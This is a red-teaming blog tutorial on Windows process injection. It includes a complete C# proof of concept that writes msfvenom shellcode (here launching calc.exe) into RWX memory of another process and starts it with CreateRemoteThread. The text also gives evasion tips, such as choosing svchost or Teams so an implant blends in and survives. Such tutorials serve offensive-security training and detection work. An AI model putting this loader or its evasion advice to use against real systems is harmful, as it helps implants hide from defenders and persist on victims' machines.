---
layout: post
title:  "Introduction to Windows Process Injection"
date:   2021-08-3 10:56:00 +0000
categories: red-teaming windows
---

So, what is process injection? I personally believe the folk at MITRE have the perfect summary:

*"Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges."* ~ [attack.mitre.org](https://attack.mitre.org/techniques/T1055)

### Contents
1. [Benefits of Process Injection](#benefits-of-process-injection)
2. [Fundamental Theory](#fundamental-theory)
    - [Processes Threads and Win32 API](#processes-threads-and-win32-api)
    - [OpenProcess API](#openprocess-api)
    - [Selecting a Target](#selecting-a-target)
3. [Writing a Process Injection PoC](#writing-a-process-injection-poc)
4. [Summary](#summary)

## Benefits of Process Injection

**What's the point in process injection if I already have RCE?**

When obtaining a reverse shell, be it a cobalt strike beacon, meterpreter, or some other arbitrary reverse shell, it must execute within a process. A typical shellcode runner executes the shellcode within its own process. 

However, there are issues with this approach - the victim may close the process which may shut down your reverse shell. The more pressing matter is that security software may detect network communication from an unrecognised process and terminate your implant. One solution to this of course, among many, is process injection/migration, thus helping to extend the longevity of your implant.

Process injection can also help your implant blend in to a victim's environment. For example injecting into an svchost.exe process if it's making network traffic, or within notepad.exe if it is reading files. As a result the blue team and accompanying security software have to be that bit more sophisticated in order to detect your implant.

## Fundamental Theory

#### Processes Threads and Win32 API

According to [this piece of Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads), the definition to a process on windows is as follows:

*"A process has a virtual address space, executable code, open handles to system objects, a security context, a unique process identifier, environment variables, a priority class, minimum and maximum working set sizes, and at least one thread of execution. Each process is started with a single thread, often called the primary thread, but can create additional threads from any of its threads."* ~ [Microsoft](https://docs.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads)

On the other hand, a thread executes the compiled assembly code of its parent Process. A process may have multiple threads executing code at any given time to allow for simultaneous execution of code. An important property to keep in mind is that each thread will have its own stack, whilst *sharing* the virtual memory address space of the parent process!

As previously mentioned, each process has its own seperate virtual address space, and although these spaces are not meant to interact with one another it is possible to accomplish this by taking advantage of the Win32 API. The general idea is to initiate process injection by opening a communication channel from one process to another through the Win32 API's `OpenProcess` API. This allows you to modify its memory space through the use of `VirtualAllocEx` and `WriteProcessMemory` APIs. Finally creating a new execution thread inside the remote process via `CreateRemoteThread`.

#### OpenProcess API

**What does it do and how do I use it?**

The [OpenProcess API](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) opens an existing local process object for interaction and returns a process handle to the user. A total of three parameters are required when being called, and are as follows.

1. `dwDesiredAccess`
    - The access to the process object.
    - This access right is checked against the security descriptor for the process, and its value can be one or more of the [process access rights](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
2. `bInheritHandle`
    - If this value is `TRUE`, processes created by this process will inherit the handle. Otherwise the processes do not inherit this handle.
    - For the sake of process injection, this is not required and thus `false` will be passed to the call.
3. `dwProcessId`
    - The process identifier (pid) of the local process to be opened.
    - If this specified process is the System Idle process (0x0), the API call will fail with an error code `ERROR_INVALID_PARAMETER`.
    - If the specified process is the System process or one of the Client Server Run-Time Subsystem (CSRSS) processes, this call again will fail with the error code `ERROR_ACCESS_DENIED` because their access restrictions prevent user-level code from opening them.

**What processes is it possible to inject in to?**

In order to call `OpenProcess` successfully, your current process must possess the appropriate security descriptor. Every process has a Security Descriptor that specifies the file permissions of the executable and access rights of a user or group which originates from the creator of said process. This aims to block privilege escalation.

In addition to this, all processes also have an integrity level that restricts access to them. This works by blocking access from one process to another that has a higher integrity level, however accessing a process with a lower or equal integrity level is generally possible.

A great example of this is when trying to inject into a process such as notepad.exe. If you were to run notepad as a normal user you would see that the process runs at a medium integrity level (normal for most processes), and thus you should be able to inject into it. However, if you were to run notepad.exe as an administrator, it would run as a high integrity level process and thus unless you have attained administrator / system privileges prior to injection, it will not be possible.

#### VirtualAllocEx WriteProcessMemory and CreateRemoteThread APIs

**The VirtualAllocEx API**

The [VirtualAllocEx API](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The call initialises the memory it allocates to zero. A total of 5 parameters are required when being called. More details can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

**The WriteProcessMemory API**

The [WriteProcessMemory API](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) writes data to an area of memory in a specified process. The entire area to be written to must be readable/writeable or the operation fails. A total of 5 parameters are required when being called. More details can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

**The CreateRemoteThread API**

The [CreateRemoteThread API](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) creates a thread that runs in the virtual address space of another process. Use the API to create a thread that runs in the virtual address space of another process and optionally specify extended attributes. More details can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

#### Selecting a Target

An easy target to prove a concept is usually notepad.exe or calc.exe, so that is what the code examples in this blog post will focus on. However on a real engagement I would recommend looking for applications that the user commonly uses (such as microsoft teams etc.) that are not stored in `C:\Windows\system32` and are usually seen making network traffic, this way they will seem less suspicious when they start generating network traffic.

## Writing a Process Injection PoC

In order to interact with the Win32 API, we can take advantage of `DllImport`. DllImport will allow us to declare and import Win32 APIs using the `DllImportAttribute` class. This will allow us to invoke functions in unmanaged (native) dlls.

However, before using this we must translate the C data types in use with the Win32 APIs, to C# data types. This can be achieved by taking advantage of Platform Invocation Services (P/Invoke). The P/Invoke APIs are contained in the System and System.Runtime.InteropServices namespaces and must be imported.

The `DllImport` code blocks below can be found through [www.pinvoke.net](https://www.pinvoke.net/).

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        // pinvoke OpenProcess 
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // pinvoke VirtualAllocEx
        // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // pinvoke WriteProcessMemory
        // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // pinvoke CreateRemoteThread
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
```

Next, within our main function, we will define the byte array of which our shellcode will be stored. This can be generated in a variety of ways, I personally used msfvenom to generate a simple calc.exe payload to show off the concept.

```csharp
static void Main(string[] args)
{
    // Our shellcode to be injected into our target process
    byte[] buf = new byte[276] {
        0xfc,0x48,0x83,
        // [...SNIP...]
        0x78,0x65,0x00 
    };
}
```

Now to perform the actual process injection, first make a call to `OpenProcess`, this will give us a handle to the process with `PROCESS_ALL_ACCESS` permissions. This allows us to read and write to the process's virtual memory space among many other interactions.

*Note: for purposes of the PoC, I hardcoded the pid, in a real malware sample this would not be the case*

```csharp
// Open handle to calc process (access: PROCESS_ALL_ACCESS, pid: 7568)
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 7568);
```

Now that we have our process handle, we can allocate a section of readable, writeable, executable (rwx) memory within it's memory space. This is where our shellcode will be written to later on.

```csharp
// Allocate 0x1000 bytes of rwx memory in the target process
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

Now that we have the address of our newly allocated rwx memory, we are ready to write our shellcode to that memory region.

```csharp
// Write our shellcode to the newly allocated rwx memory in the target process
IntPtr numBytesWritten;
WriteProcessMemory(hProcess, addr, buf, buf.Length, out numBytesWritten);
```

Now that we have successfully written our shellcode to an executable section of memory within our target process, we can make a call to `CreateRemoteThread` in order to start a thread of execution starting at the beginning of our shellcode.

```csharp
// Create a thread of execution starting at the beginning of the newly written shellcode. 
// Leaving params at 0 means windows will decide.
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

So, bringing all of this together, we get the following final PoC:

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        // pinvoke OpenProcess 
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // pinvoke VirtualAllocEx
        // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // pinvoke WriteProcessMemory
        // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // pinvoke CreateRemoteThread
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // Our shellcode to be injected into our target process
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 
            };

            // Open handle to calc process (access: PROCESS_ALL_ACCESS, pid: 7568)
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 7568);

            // Allocate 0x1000 bytes of rwx memory in the target process
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Write our shellcode to the newly allocated rwx memory in the target process
            IntPtr numBytesWritten;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out numBytesWritten);

            // Create a thread of execution starting at the beginning of the newly written shellcode. 
            // Leaving params at 0 means windows will decide.
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

This code will gain a handle to the process with pid `7568`, allocate `0x1000` (4096) bytes of rwx memory, and write our shellcode there. Once done, it will then create a thread of execution starting at the newly written shellcode, finalizing the process injection.

## Summary

Hopefully this blog post should have highlighted the fundamentals of windows process injection, as well as giving a good understanding as to why this technique could become invaluable in a real-world scenario. The ideas and techniques here can be transposed to almost any process injection technique, and can be very easily worked upon.

That's all, hope you learned and good luck :)